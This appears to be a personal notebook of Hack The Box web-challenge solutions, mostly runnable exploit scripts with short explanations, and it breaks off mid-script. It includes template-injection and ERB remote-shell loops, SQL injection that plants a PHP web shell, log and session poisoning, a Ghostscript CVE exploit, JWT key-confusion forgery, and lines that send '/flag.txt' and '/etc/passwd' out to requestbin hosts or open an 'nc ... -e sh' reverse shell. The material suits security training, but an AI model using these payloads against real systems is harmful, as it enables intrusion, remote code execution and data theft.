# Web 
## Templated
flask template injection
#pythoninjection 
```python
import requests, urllib.parse

URL = "http://157.245.46.136:30454/"


while True:
    a = urllib.parse.quote("{{request.application.__globals__.__builtins__.__import__('os').popen('" + input('$>') + "').read()}}")
    print(a)
    r = requests.get(URL+a)
    print(r.text)
```

## BlinkerFluids
markdown css injection
#### read directory
```
---js
{
    css: `body::before { content: "${require('fs').readdirSync('/').join()}"; display: block }`,
}
---
```
#### read file
```
---js
{
    css: `body::before { content: "${require('fs').readFileSync('/flag.txt', 'utf8')}"; display: block }`,
}
---
```
### Referensi
https://snyk.io/test/npm/md-to-pdf/2.8.2




## Amidst Us
client side requests injection
```json
{
			"image":"/9j/4AAQSkZJRgABAQEAYABgAAD/4QBARXhpZgAASUkqAAgAAAABAGmHBAABAAAAGgAAAAAAAAACAAKgCQABAAAAmgYAAAOgCQABAAAA1gUAAAAAAAD/2wBDAAMCAgMCAgMDAwMEAwMEBQgFBQQEBQoHBwYIDAoMDAsKCwsNDhIQDQ4RDgsLEBYQERMUFRUVDA8XGBYUGBIUFRT/2wBDAQMEBAUEBQkFBQkUDQsNFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBT/wAARCAACAAIDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAj/xAAcEAACAgIDAAAAAAAAAAAAAAAAAQQFAhNDUmH/xAAUAQEAAAAAAAAAAAAAAAAAAAAF/8QAGBEAAgMAAAAAAAAAAAAAAAAAAAIBMTL/2gAMAwEAAhEDEQA/AIiuLuxVvOSnykt+fNl2foAHFoIbUn//2Q==",

"background":[
	"exec(\"import os;os.system('wget https://requestbin.io/1khl0og1'+'?'+'result=$(cat /flag.txt)')\")",
	255,
	255
]
}
```

## Phonebook
wild card brute force
```python
import requests, threading

URL = "http://157.245.46.136:31804/login"
_list_ = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}"

knownChars = ""
def request(i):
    global knownChars
    DATA = {
        "username": knownChars+i+"*",
        "password": "*"
    }
    r = requests.post(URL, data=DATA)
    if len(r.text) != 2214:
        knownChars += i
        
while True:
    for i in _list_:
        t = threading.Thread(target=request, args=(i))
        t.start()
    t.join()
    print(knownChars)
```

```python
import requests, threading

URL = "http://157.245.46.136:31804/login"
_list_ = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_"

knownChars = ""
def request(i):
    global knownChars
    DATA = {
        "username": "*",
        "password": knownChars+i+"*"
    }
    r = requests.post(URL, data=DATA)
    if len(r.text) != 2214:
        knownChars += i
        
while True:
    for i in _list_:
        t = threading.Thread(target=request, args=(i))
        t.start()
    t.join()
    print(knownChars)
```
## Weather App
node js CVE SSRF via request splitting 
```python
import requests

URL = "http://157.245.46.136:31675"

username = "admin"
password = "1' ) ON CONFLICT (username) DO UPDATE SET password = '1' --"

parsedUsername = username.replace(" ", "%20").replace("'", "%27").replace('"', "%22")
parsedPassword = password.replace(" ", "%20").replace("'", "%27").replace('"', "%22")

contentLenght = len(parsedUsername) + len(parsedPassword) + len("username=") + len("password=") + len("&")

endpoint =  '127.0.0.1/\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010A\u010D\u010APOST\u0120/register\u0120HTTP/1.1\u010D\u010AHOST:\u0120127.0.0.1\u010D\u010AContent-Type:\u0120application/x-www-form-urlencoded\u010D\u010AContent-Length:\u0120' + str(contentLenght) + '\u010D\u010A\u010D\u010Ausername=' + parsedUsername + '&password=' + parsedPassword + '\u010D\u010A\u010D\u010AGET\u0120/?lol='
r = requests.post(URL + '/api/weather', json={'endpoint': endpoint, 'city': 'chengdu', 'country': 'CN'})
print(r)
```
### Reference
- https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/
- https://blog.csdn.net/f_cccc/article/details/116406838
- https://www.cnblogs.com/a-qi/p/14723101.html

## LoveTok
php parameter injection
```python
import requests, urllib.parse, readline, re

URL = "http://167.71.142.156:32015"

while True:
    pwd = input("$ ")
    readline.get_completer()
    pwd = urllib.parse.quote_plus(pwd)
    r = requests.get(URL+"/?format=${system($_GET[pwd])}&pwd="+pwd)
    text = r.text
    text = re.sub(r'<html>.*', '', text, flags=re.DOTALL)
    print(text)
```
## Toxic
log poisoning
```python
import requests, base64

URL = "http://157.245.33.77:30524/"

def log_poisoning(cmd):
    HEADER = {'User-Agent': "<?php system('"+cmd+"'); ?>"}
    requests.get(URL, headers=HEADER)
    print("[+] Log poisoning successful")

dir = "/var/log/nginx/access.log" 
s   = "25"
COOKIE = 'O:9:"PageModel":1:{s:4:"file";s:'+s+':"'+dir+'";}'
COOKIE = base64.b64encode(COOKIE.encode()).decode()

cmd = "cat /flag*"
log_poisoning(cmd)
print(COOKIE)
r = requests.get(URL, cookies={"PHPSESSID": COOKIE})
print(r.text)
```

## petpet rcbee
CVE-2018-16509
```python
import requests, readline


URL = "http://206.189.25.173:30074"

while True:
    cmd = input("Enter command: ")
    readline.set_completer_delims(' \t\n;')
    PS_PAYLOAD = """%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%"""+cmd+""" > /app/application/static/petpets/test.txt) currentdevice putdeviceprops"""

    r = requests.request("POST", URL+"/api/upload", files={"file": ("test.jpg", PS_PAYLOAD)})
    print(r.text)
    r = requests.get(URL+"/static/petpets/test.txt")
    print(r.text)
```
### Referensi
- https://github.com/farisv/PIL-RCE-Ghostscript-CVE-2018-16509
- https://shakuganz.com/2021/06/11/hackthebox-petpet-rcbee-write-up/
- https://arush15june.github.io/posts/2020-11-09-csaw-ctf-finals-2020-writeup/
## AbuseHumanDB
### Vuln
```js
router.get('/api/entries/search', (req, res) => {
	if(req.query.q) {
		const query = `${req.query.q}%`;
		return db.getEntry(query, isLocalhost(req))
			.then(entries => {
				if(entries.length == 0) return res.status(404).send(response('Your search did not yield any results!'));
				res.json(entries);
			})
			.catch(() => res.send(response('Something went wrong! Please try again!')));
	}
	return res.status(403).json(response('Missing required parameters!'));
});
```
### Solve
Server side xs leaks
`index.html`
```html
<html>
<script>
    var ip = '127.0.0.1:1337';
    // var ip = '157.245.46.136:30797';
    var hook = 'requestbin.io/y14bway1';
    var flag = 'HTB{5w33t_ali3ndr3n_0f_min3!';
    var abc = '-+!@abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_';
    var special = '_%\”\'';
    var url1 = `http://${ip}/api/entries/search?q=`
    async function getPartialFlag(char) {
        return new Promise((resolve, reject) => {
            const script = document.createElement("script");
            script.src = url1 + encodeURIComponent(flag + char);
            script.onload = () => char ==='}' ?reject(char): resolve(char);
        script.onerror = () => reject(char);
        document.head.appendChild(script);
    });
}
    async function getFlag(chars) {
        var b = false; var char;
        for (var i = 0; i < chars.length; i++) {
            char = special.includes(chars[i]) ? '\\'+chars[i]: chars[i];
            await getPartialFlag(char).then((res) => { flag = flag.concat(res); b = res ===' }' ?true: false; i = 0
        } , (res) => { } );
        if (b) break;
    }
    fetch(`https://${hook}/flag=${flag}`, { method:'get' });
};
    getFlag(abc);
</script>
<html>
```

```sh
#!/bin/sh

konsole -e "python3 -m http.server 4444" &
ngrok http 4444
```
### Referensi
- https://skelter.hashnode.dev/htb-abusehumandb-writeup
- https://xsleaks.dev/

## Diogenes' Rage
Racing condition vulnerability
```js
...snip...
	async getCoupons() {
		return new Promise(async (resolve, reject) => {
			try {
				let stmt = await this.db.prepare('SELECT * FROM coupons;');
				resolve(await stmt.all());
			} catch(e) {
				reject(e);
			}
		});
	}
...snip...
```

```
Asynchronous JavaScript
Asynchronous JavaScript: Asynchronous code allows the program to be executed immediately where the synchronous code will block further execution of the remaining code until it finishes the current one.
```
###  Solve
```python
import requests, multiprocessing

COOKIE = {'session' : 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InR5bGVyXzg2MDFlOTEyN2YiLCJpYXQiOjE2NTU1MDkyMTd9.uN3Gh9Ora7DyDAwJnxoZ_WkTzjFkVg80vowQ-xV4vLg'}
URL = "http://159.65.85.171:32205"

def req():
    r = requests.post(URL + "/api/coupons/apply", json={'coupon_code': 'HTB_100'}, cookies=COOKIE)
    print(r.text)

for i in range(20):
    t = multiprocessing.Process(target=req)
    t.start()
```
## Neonify
```rb
...snip...
  post '/' do
    if params[:neon] =~ /^[0-9a-z ]+$/i #vuln to newline /^+$
      @neon = ERB.new(params[:neon]).result(binding)
    else
      @neon = "Malicious Input Detected"
    end
    erb :'index'
  end
...snip...
```

vuln regex parser
```python
import requests, readline, re

URL = "http://206.189.25.173:32376"

while True:
    malcode = input("Virt /bash> ")
    readline.set_completer_delims(' \t\n;')
    r = requests.post(URL, data={"neon": 'a\n<%= %x['+malcode+'] %>'})
    r = re.sub(r'.*<h1 class="glow">a', '', r.text, flags=re.DOTALL)
    r = re.sub(r'</h1>.*', '', r, flags=re.DOTALL)
    print(r)
```

### Referensi
- https://stackoverflow.com/questions/2232/how-to-call-shell-commands-from-ruby
- https://drt.sh/posts/htb-neonify/

## EasterBunny
cache poisoning
`./static/viewletter.js`
```js
fetch("http://127.0.0.1:80/message/3").then((r) => {
    return r.text();
}).then((x) => {
    fetch("http://127.0.0.1:80/submit", {
        "headers": {
            "content-type": "application/json"
        },
        "body": x,
        "method": "POST",
        "mode": "cors",
        "credentials": "omit"
    });
});
```

`./deploy.sh`
```sh
#!/bin/sh

konsole -e "python3 -m http.server 4444" & 
konsole -e "ngrok http 4444"
```

```python
import requests,re

URL = "http://206.189.25.173:30816"
ATKSERVER = "dcd6-112-215-219-60.ap.ngrok.io" 
LETTERNUM = "6"
HEADER = {"Host": "127.0.0.1",
          "X-Forwarded-Host": ATKSERVER,}

print("[*] Replace cdn with malcious domain...")

r = requests.get(URL+"/letters?id="+LETTERNUM, headers=HEADER)
r = re.sub(r'.*<meta name="viewport" content="width=device-width, initial-scale=1.0" />', '', r.text, flags=re.DOTALL)
r = re.sub(r'<link rel="preconnect" href="https://fonts.googleapis.com" />.*', '', r, flags=re.DOTALL)
print(r)

print("[*] Sending letter...")

r = requests.post(URL+"/submit", json={"message": "bogus"})
print(r.text)
```
### Referensi
- https://varnish-cache.org/docs/trunk/users-guide/vcl.html
- https://portswigger.net/web-security/web-cache-poisoning#:~:text=Web%20cache%20poisoning%20is%20an,is%20served%20to%20other%20users.
- https://domdom.tistory.com/entry/Hackthebox-EasterBunny-Writeup%EB%AC%B8%EC%A0%9C%ED%92%80%EC%9D%B4

## Spiky Tamagotchi
### Vuln 1
SQL injection, escaping query value
```
Objects are turned into key = 'val' pairs for each enumerable property on the object. If the property's value is a function, it is skipped; if the property's value is an object, toString() is called on it and the returned value is used.
```
- https://github.com/mysqljs/mysql/blob/master/Readme.md#escaping-query-values

the prepared statement:

SELECT username FROM users WHERE username = ? AND password = ?

become:

SELECT username FROM users WHERE username = 'admin' AND password = `password` = 1

so, the evaluation is like:

```
`password` =is=> password column
password = `password` =evaluated as=> true (1)

password = [user input]
password = `password` = 1
1 = 1

1 = 1 =evaluated as=> true
```
- https://gist.github.com/pich4ya/c033a1d147f8eb0348c10ed1a44fc2dc

```js
...snip...
    async loginUser(user, pass) {
		return new Promise(async (resolve, reject) => {
			let stmt = 'SELECT username FROM users WHERE username = ? AND password = ?';
            this.connection.query(stmt, [user, pass], (err, result) => {
                if(err || result.length == 0)
                    reject(err)
                resolve(result)
            })
		});
	}
...snip...
```
### vuln 2
Remote code execution throught json http post injection
```js
...snip...
const calculate = (activity, health, weight, happiness) => {
    return new Promise(async (resolve, reject) => {
        try {
            // devine formula :100:
            let res = `with(a='${activity}', hp=${health}, w=${weight}, hs=${happiness}) {
                ...snip...
                }`;
            quickMaths = new Function(res);
            ...snip...
}
...snip...
```

### Solve
```python
import requests


URL = "http://159.65.85.171:31369"

r = requests.post(URL+"/api/login", json={"username": "admin",
                                          "password": {"password": 1},
                                          })
COOKIE = r.headers['Set-Cookie']
COOKIE = COOKIE.split(';')[0].split('=')
COOKIE = {COOKIE[0]: COOKIE[1]}

# WEBHOOK = "https://requestbin.io/173p1ta1"
ATKSERVER = "157.245.55.36"
ATKPORT = "4444"
# r = requests.post(URL+"/api/activity", cookies=COOKIE, json={"activity":"sleep'+(global.process.mainModule.require('child_process').execSync('curl "+WEBHOOK+"\?`cat /etc/passwd | base64`'))+'",
#                                              "health":"100",
#                                              "weight":"1000",
#                                              "happiness":"100"})

r = requests.post(URL+"/api/activity", cookies=COOKIE, json={"activity": "sleep'+(global.process.mainModule.require('child_process').execSync('nc "+ATKSERVER+" "+ATKPORT+" -e sh'))+'",
                                                             "health": "100",
                                                             "weight": "1000",
                                                             "happiness": "100",
                                                             })
print(r.text)
```
### Referensi
- https://github.com/mysqljs/mysql/blob/master/Readme.md#escaping-query-values
- https://gist.github.com/pich4ya/c033a1d147f8eb0348c10ed1a44fc2dc

## Intergalactic Post
sql injection
```php
...snip...
    public function subscribeUser($ip_address, $email)
    {
        return $this->db->exec("INSERT INTO subscribers (ip_address, email) VALUES('$ip_address', '$email')"); // $ip_address and $email
    }
...snip...
```

```php
...snip...
    public function subscribe($email)
    {
        $ip_address = $this->getSubscriberIP();
        return $this->database->subscribeUser($ip_address, $email); // call subscribeUser()
    }
...snip...
```

```php
...snip...
    public function store($router)
    {
        $email = $_POST['email'];

        if (empty($email) || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
            header('Location: /?success=false&msg=Please submit a valild email address!');
            exit;
        }

        $subscriber = new SubscriberModel;
        $subscriber->subscribe($email);

        header('Location: /?success=true&msg=Email subscribed successfully!');
        exit;
    }
...snip...
```

```php
...snip...
$router = new Router();
$router->new('GET', '/', 'IndexController@index');
$router->new('POST', '/subscribe', 'SubsController@store'); // post request
...snip...
```

```python
import requests, urllib.parse, readline

HEADER = {'X-Forwarded-For': "blahblah','blahblah');ATTACH DATABASE '/www/lol.php' as lol;CREATE TABLE lol.pwn(dataz text); INSERT INTO lol.pwn (dataz) VALUES (\"<?php system($_GET['cmd']); ?>\");--"}
DATA = {'email': 'dimas@gmail.com'}
URL = "http://206.189.25.173:30304"

requests.post(URL+"/subscribe", headers=HEADER, data=DATA)
while True:
    CMD = input("$ ")
    CMD = urllib.parse.quote_plus(CMD)
    readline.set_completer(lambda text, state: [i for i in CMD.split(" ") if i.startswith(text)][state])
    r = requests.get(URL+"/lol.php?cmd="+CMD)
    print(r.text)
```
## interdimensional internet
Debug mode?
```
...snip...
</body>
<!-- /debug -->
</html>
...snip...
```

```python
...snip...
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'tlci0GhK8n5A18K1GTx6KPwfYjuuftWw')
...snip...
```

decode and encode flask_session
```python
import flask_unsign, requests, colorama

URL = 'http://138.68.139.134:30191'
SECRET = "tlci0GhK8n5A18K1GTx6KPwfYjuuftWw"

color = colorama.Fore.GREEN + colorama.Style.BRIGHT
coreset = colorama.Style.RESET_ALL

# r = requests.get(URL)
# print(f'{color}flask_cookie: {coreset}{r.cookies["session"]}')

# d = flask_unsign.decode(r.cookies['session'])
# print(f'{color}flask_cookie_decoded: {coreset}{d}')

with open("payload.txt", "r") as f:
    payload = f.read()
# print(payload)
x = flask_unsign.sign({'ingredient': b'i', 'measurements': payload}, SECRET)
print(f'{color}flask_cookie_signed: {coreset}{x}')
```

craft flask_session payload python2 
#pythoninjection
```python
import re

recipe = """exec "i={}.__class__.__base__.__subclasses__()[59]()._module.__builtins__['__import__']\\ni('time').sleep(5)\""""
bypass_dict = {
    "(": "\\x28",
    "[": "\\x5B",
    "_": "\\x5F",
    ".": "\\x2E",
}
recipe_ricing = re.compile('|'.join(map(re.escape, bypass_dict.keys())))
recipe_ricing = recipe_ricing.sub(lambda m: bypass_dict[m.group(0)], recipe)

regex = re.compile('|'.join(map(re.escape, ['[', '(', '_', '.'])))
matches = regex.findall(recipe_ricing)

print(matches)

builtins, garage = {'__builtins__': None}, {}
# exec(recipe_ricing, builtins, garage) 

recipe_ricing = recipe_ricing.replace('\\', '\\\\')
with open("payload.txt", "w") as f:
    f.write(recipe_ricing)
print(recipe_ricing)
```

### Solve
flask cookie injection
```python
import flask_unsign, re, requests, readline

URL = 'http://206.189.25.173:31207'
SECRET = "tlci0GhK8n5A18K1GTx6KPwfYjuuftWw"

def payload():
    recipe = '''1
exec "i={}.__class__.__base__.__subclasses__()[59]()._module.__builtins__['__import__']\\ni('flask').session['x']=i('os').popen('%s').read()"'''
    bypass_dict = {
        "(": "\\x28",
        "[": "\\x5B",
        "_": "\\x5F",
        ".": "\\x2E",
    }
    recipe_ricing = re.compile('|'.join(map(re.escape, bypass_dict.keys())))
    recipe_ricing = recipe_ricing.sub(lambda m: bypass_dict[m.group(0)], recipe)
    return recipe_ricing

def sign(payload):
    return flask_unsign.sign({'ingredient': 'i', 'measurements': payload}, SECRET)

def unsign(session):
    return flask_unsign.decode(session)

while True:
    cmd = input(">> ")
    readline.add_history(cmd)
    r = requests.get(URL, cookies={'session': sign(payload()%cmd)})
    
    r = r.headers['Set-Cookie']
    r = re.findall(r'(?<=session=)[^;]*', r)[0]
    theCookie = unsign(r)
    
    x = theCookie['x']
    print(x.decode())
```
### Referensi
- https://www.programiz.com/python-programming/methods/built-in/exec
- https://d4rkstat1c.medium.com/interdimensional-internet-hackthebox-writeup-5f8e5b27e3a
- https://www.youtube.com/watch?v=iGEBjeuKW90

## Under Construction
Generate malcious JWT that contain SQLI
```sh
#!/bin/sh
URL="http://157.245.33.77:30385"
COOKIE="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEyMyIsInBrIjoiLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS1cbk1JSUJJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBUThBTUlJQkNnS0NBUUVBOTVvVG05RE56Y0hyOGdMaGpaYVlcbmt0c2JqMUt4eFVPb3p3MHRyUDkzQmdJcFh2NldpcFFSQjVscW9mUGxVNkZCOTlKYzVRWjA0NTl0NzNnZ1ZEUWlcblh1Q01JMmhvVWZKMVZtak5lV0NyU3JEVWhva0lGWkV1Q3VtZWh3d3RVTnVFdjBlekM1NFpUZEVDNVlTVEFPemdcbmpJV2Fsc0hqL2dhNVpFRHgzRXh0ME1oNUFFd2JBRDczK3FYUy91Q3ZoZmFqZ3B6SEdkOU9nTlFVNjBMTWYybUhcbitGeW5Oc2pOTndvNW5SZTd0UjEyV2IyWU9DeHcydmRhbU8xbjFrZi9TTXlwU0tLdk9najV5MExHaVUzamVYTXhcblY4V1MrWWlZQ1U1T0JBbVRjejJ3Mmt6QmhaRmxINlJLNG1xdWV4SkhyYTIzSUd2NVVKNUdWUEVYcGRDcUszVHJcbjB3SURBUUFCXG4tLS0tLUVORCBQVUJMSUMgS0VZLS0tLS1cbiIsImlhdCI6MTY1NTg3ODgyOH0.aE6ML5EoRI8IwO_W56Oo02QP8CIz1HD8sHtxRU3ep7MsUqdn68Momjnmx4XsykaeiHKKpTukvy5VtVdQLF0uFZuUTfYR8FvngY1dwxfWitQvAWbQwIYjv1C0sUoVo0vU4LF2icfW0d9By3fQMZB64NkmSfv0bFKt0s6zuSJASFAADMPFI9KvuPMniMG5NZEqFuEAUtU51AEXIBVmXqxxmucIBwpMXNPkBuhE2tRyvapWVssiXas0kUPBi-bz5vx1AzH8L9fnNf4PBfvUAyhoDAOjQI_m-dlRuEHeBQZIuXE8RhxA25oODCeolQUyAR8jy7xQS-pPEUXctgJ8wo-0Ug"
PEM=`cat <<EOF
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA95oTm9DNzcHr8gLhjZaY
ktsbj1KxxUOozw0trP93BgIpXv6WipQRB5lqofPlU6FB99Jc5QZ0459t73ggVDQi
XuCMI2hoUfJ1VmjNeWCrSrDUhokIFZEuCumehwwtUNuEv0ezC54ZTdEC5YSTAOzg
jIWalsHj/ga5ZEDx3Ext0Mh5AEwbAD73+qXS/uCvhfajgpzHGd9OgNQU60LMf2mH
+FynNsjNNwo5nRe7tR12Wb2YOCxw2vdamO1n1kf/SMypSKKvOgj5y0LGiU3jeXMx
V8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr
0wIDAQAB
-----END PUBLIC KEY-----
EOF
`; echo $PEM > PEM.pem
jwt_tool="/home/wowon/Documents/My Project/MyTools/bin/jwt_tools/jwt_tool.py"
# PAYLOAD="injected hehe' union select 1,1,1--;"
# PAYLOAD="injected hehe' union select 1,2,3--;"
# PAYLOAD="injected hehe' union select 1, name, 2 from sqlite_master where type='table' limit 1 offset 0--"
# PAYLOAD="injected hehe' union select 1, sql,2 from sqlite_master where tbl_name = 'flag_storage' and type = 'table' limit 1 offset 0--"
PAYLOAD="injected hehe' union select 1,top_secret_flaag,2 from flag_storage limit 1 offset 0--"

NEW_COOKIE=$(python3 $jwt_tool $COOKIE -I -pc username -pv "$PAYLOAD" -X k -pk `pwd`/PEM.pem |\
grep -Eo --regexp="\[\+\].+?" | cut -c 5-)
echo $NEW_COOKIE
```
### Reference
- https://nav7neeet.medium.com/jwt-key-confusion-attack-part2-e43385e658ba
- https://nav7neeet.medium.com/jwt-key-confusion-attack-part1-556c2db4f148
- http://demo.sjoerdlangkemper.nl/jwtdemo/public.pem
- https://jwt.io/ //jwt editor
- https://joshuanatan.medium.com/hackthebox-web-under-construction-d60ce177ba9c
- https://gist.github.com/wulfgarpro/3e87ae77a7107a3e3a2453eb38a3de20 // jwt_forge.py
- https://www.wulfgar.pro/hackthebox-under-construction/

## breaking grad
Bypassing waf and create malcious json post requests
```python
import json
import requests
URL = "http://138.68.185.195:31438"
HEADERS = {'Content-Type': 'application/json'}
PAYLOAD = {
    'constructor': {
        'prototype': {
            'execPath': 'ls',
            'execArgv': [
                '-a'
            ]
        }
    }
}

payload = json.dumps(PAYLOAD)
requests.post(URL + '/api/calculate', headers=HEADERS, data=payload)
r = requests.get(URL + '/debug/version')
print(r.text)
```

### Reference
- https://medium.com/intrinsic-blog/javascript-prototype-poisoning-vulnerabilities-in-the-wild-7bc15347c96#:~:text=__proto__,of%20the%20__proto__%20.
- https://d4rkstat1c.medium.com/breaking-grad-hackthebox-write-up-9e780ff2b68b
- https://rollbar.com/blog/javascript-constructors/#:~:text=A%20constructor%20is%20a%20special,for%20any%20existing%20object%20properties.
- https://y3a.github.io/2021/06/15/htb-breaking-grad/
- https://github.com/d4rk007/ctfs/blob/main/BreakingGrad/exploit.py
- https://sebhastian.com/nodejs-fork/#:~:text=The%20fork()%20method%20accepts,pass%20to%20the%20child%20process

## Mr. Burns
Vuln to LFI
```php
$router->new('GET', '/miner/{param}', 'MinerController@show');
...snip...
<?php
class MinerController 
{
    public function show($router, $params) 
    {   
        $miner_id = $params[0];
        include("./miners/${miner_id}");
        if (empty($minerLog))
        {
            return $router->abort(400);
        }
        return $router->view('miner', ['log' => $minerLog]);
    }
}
```
LFI Payload
```
..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd
```

```
..%252F..%252F..%252F..%252F..%252F..%252F..%252Ftmp%252Fdemo_miner.log
```

```python
import requests

URL = "http://46.101.28.14:31051"
LFIPAY = "..%252F..%252F..%252F..%252F..%252F..%252F.."
FILE = "/tmp/demo_miner.log".replace("/", "%252F")
r = requests.get(URL+"/miner/"+LFIPAY+FILE)
print(r.text)
```

restriction
```php
# Disable dangerous functions
RUN echo "disable_functions = exec, system, popen, proc_open, shell_exec, passthru, ini_set, putenv, pfsockopen, fsockopen, socket_create" >> disablefns.ini

# Restrict filesystem access to PHP
RUN echo "open_basedir = /www:/tmp" >> openbdir.ini
```

```python
import requests
import multiprocessing

URL = "http://46.101.28.14:30674"
SESSION = "dimas"


SESID = f"sess_{SESSION}"

# create shell in /tmp folder that contain code to execute /readflag and make it executable.
SHELL_PAYLOAD = """<?php file_put_contents("/tmp/rce.sh", "/readflag > /tmp/flag");chmod('/tmp/rce.sh', 0777); ?>"""
# use mail command to execute shell script in /tmp/rce.sh
MAIL_PAYLOAD = """<?php mail("root@localhost", "x", "x", "x", "-H /tmp/rce.sh"); ?>"""

# generate lfi url
def gen_lfi_url(file_name):
    lfipayload = "..%252F..%252F..%252F..%252F..%252F..%252F.."
    file = f"/tmp/{file_name}".replace("/", "%252F")
    return URL+"/miner/"+lfipayload+file

# write POST HTTP requests to create session id that contain malcious php code
def write_tmp(payload):
    phpsessid = {'PHPSESSID': SESSION}
    junk_file = {'file': b'junk'}
    data = {'PHP_SESSION_UPLOAD_PROGRESS': payload}
    requests.post(URL, cookies=phpsessid, files=junk_file, data=data)


# create GET HTTP requests that has LFI in it, to access file inside /tmp folder 
def get_tmp(file_name):
    r = requests.get(gen_lfi_url(file_name))
    print(r.text)


multiprocessing.Process(target=write_tmp(payload=SHELL_PAYLOAD)).start() # write SHELL_PAYLOAD to /tmp/ses_...
multiprocessing.Process(target=get_tmp(file_name=SESID)).start() # read the file to triger php code execution
multiprocessing.Process(target=write_tmp(payload=MAIL_PAYLOAD)).start() # write MAIL_PAYLOAD to /tmp/ses_...
multiprocessing.Process(target=get_tmp(file_name=SESID)).start() # raead the file to triger php code execution
multiprocessing.Process(target=get_tmp(file_name="flag")).start() # read flag inside /tmp/ses_...
```

vulnerability so far:
- LFI
- PHPSESSID poisoning
- php remote code execution
- racer condition vulnerability
- WAF bypass
- shell remote code execution

#phpinjection
### Reference
- https://stackoverflow.com/questions/454635/where-are-session-variables-stored
- https://d4rkstat1c.medium.com/mr-burns-hackthebox-writeup-c06f90a22fa9
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-php-fpm-fastcgi
- https://www.php.net/manual/en/function.file-put-contents.php
- https://stackoverflow.com/questions/3115559/exploitable-php-functions
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass

## nginxatsu (Not Complete)
- The generator uses the original configuration of the server to generate nginx configuration?
Off-By-Slash
```nginx
location /assets { # missing trailing slash
	alias /www/public/;
}
```
we can only access files in folder /www/public
```nginx
root /www/public;
```

```sh
ffuf -ic -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://206.189.25.173:31376/assets../FUZZ
```
out:
```
.gitattributes          [Status: 200, Size: 111, Words: 6, Lines: 6, Duration: 398ms]  
.gitignore              [Status: 200, Size: 158, Words: 1, Lines: 13, Duration: 395ms]  
app                     [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 409ms]  
config                  [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 417ms]  
database                [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 408ms]  
public                  [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 413ms]  
resources               [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 408ms]  
routes                  [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 408ms]  
storage                 [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 258ms]  
tests                   [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 296ms]  
vendor                  [Status: 301, Size: 162, Words: 5, Lines: 8, Duration: 245ms]
```

```sh
ffuf -ic -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://206.189.25.173:31376/assets../FUZZ.php
```

out:
```
server                  [Status: 200, Size: 563, Words: 76, Lines: 22, Duration: 409ms]
```

The server use laravel framework
```php
<?php

/**
 * Laravel - A PHP Framework For Web Artisans
 *
 * @package  Laravel
 * @author   Taylor Otwell <taylor@laravel.com>
 */

$uri = urldecode(
    parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH)
);

// This file allows us to emulate Apache's "mod_rewrite" functionality from the
// built-in PHP web server. This provides a convenient way to test a Laravel
// application without having installed a "real" web server software here.
if ($uri !== '/' && file_exists(__DIR__.'/public'.$uri)) {
    return false;
}

require_once __DIR__.'/public/index.php';
```

Kita bisa melihat folder-folder default laravel disini: https://github.com/laravel/laravel

```
/assets../app/Http/Controllers/API/ConfigController.php
```


```php
 public function index()
{
	return NginxConfig::query()
		->where('user', Session::get('username'))
		->orderBy(Session::get('order', 'id'), Session::get('direction', 'desc'))
		->get();
}
```

```
http://206.189.25.173:31376/assets../.env
```

```
APP_KEY=base64:7PMboEIxIYUje2NOuH+ns03+fnp+e0EU8tYw13cGdj0=
```

```python
from Crypto.Cipher import AES
import base64
import json
import urllib.parse

KEY = "gP7KQsw6PWDf1B0QMAJpuVoKElC/qClPJE73iq1t28Y="
